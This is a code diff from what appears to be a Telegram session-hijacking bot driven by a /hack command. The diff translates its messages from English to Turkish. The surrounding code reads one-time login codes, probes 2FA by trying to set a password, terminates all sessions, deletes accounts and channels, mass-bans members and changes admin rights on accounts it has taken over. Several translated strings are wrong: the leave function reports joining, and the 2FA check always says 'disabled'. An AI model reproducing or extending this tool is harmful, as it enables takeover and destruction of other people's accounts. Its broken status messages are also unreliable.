@@ -34,7 +34,7 @@ async def users_gc(session):
                 print(e)
             k = await steve(GetAdminedPublicChannelsRequest())            
             for x in k.chats:                
-                msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
+                msg += f'** ⚙️ Kanal Adı :** {x.title}\n**Kanal Link :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
             await steve.disconnect()
                  
         else:    
@@ -47,11 +47,11 @@ async def users_gc(session):
                     print(e)    
                 k = await stark.invoke(functions.channels.GetAdminedPublicChannels())            
                 for x in k.chats:
-                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
+                    msg += f'**Kanal Adı :** {x.title}\n**Kanal Link :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
     except Exception as idk:
         err += str(idk)                                             
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
     return msg
  
 async def user_info(session):
@@ -84,7 +84,7 @@ async def user_info(session):
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
     return msg    
 
 
@@ -148,9 +148,9 @@ async def banall(session,id):
                           
     except Exception as idk:
         err += str(idk) 
-    msg += f"**ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ! \n\n ʙᴀɴɴᴇᴅ Usᴇʀs:** {bann} \n **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {all}"                                            
+    msg += f"**Kullanıcılar Başarıyla Banlandı ! \n\n Kullanıcı Banlandı:** {bann} \n **Toplam Banlanan Kullanıcı Sayısı:** {all}"                                            
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
     return msg
 
 async def get_otp(session):
@@ -188,7 +188,7 @@ async def get_otp(session):
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
     return i
 
 async def join_ch(session,id):
@@ -220,8 +220,8 @@ async def join_ch(session,id):
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "Jᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
+    return "Başarıyla Katıldı!"
 
 async def leave_ch(session,id):
     err = ""
@@ -252,8 +252,8 @@ async def leave_ch(session,id):
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!"
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
+    return "Başarıyla Katıldı!"
 
 async def del_ch(session,id):
     '''
@@ -289,8 +289,8 @@ async def del_ch(session,id):
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "**ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
+    return "**Başarıyla Silindi!**"
 
 async def check_2fa(session):
     err = ""
@@ -307,11 +307,11 @@ async def check_2fa(session):
                 print(e)
             try:
                 await steve.edit_2fa("idkbsdkjsj")
-                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
+                i += "2 Faktörlü Doğrulama Kapalı"
                 
             except Exception as e:
                 print(e)
-                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
+                i += "2 Faktörlü Doğrulama Kapalı!"
                         
             await steve.disconnect() 
                              
@@ -326,15 +326,15 @@ async def check_2fa(session):
                # try:
                 yes = await stark.invoke(functions.account.GetPassword())
                 if yes.has_password:
-                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
+                    i += "2 Faktörlü Doğrulama Kapalı!"
                 else:
-                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"                                                           
+                    i += "2 Faktörlü Doğrulama Kapalı!"                                                           
     except Exception as idk:
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return i
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
+    return "2 Faktörlü Doğrulama Kapalı!"
 
 async def terminate_all(session):
     err = ""
@@ -364,8 +364,8 @@ async def terminate_all(session):
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs"
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
+    return "Oturum Başarıyla Sonlandırıldı."
 
       
 async def del_acc(session):
@@ -396,8 +396,8 @@ async def del_acc(session):
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ."
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
+    return "Hesap Başarıyla Silindi."
 
       
 FULL_PROMOTE_POWERS = ChatPrivileges(
@@ -450,8 +450,8 @@ async def piromote(session,gc_id,user_id):
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ."
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
+    return "Başarıyla Yetki Verildi."
 
 
 DEMOTE = ChatPrivileges(
@@ -499,5 +499,5 @@ async def demote_all(session,gc_id):
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ."      
+        return "**Hata:** " + err + "\n**Tekrar Deneyin /hack.**"
+    return "Yetkili Kullanıcılar Düşürüldü!"      
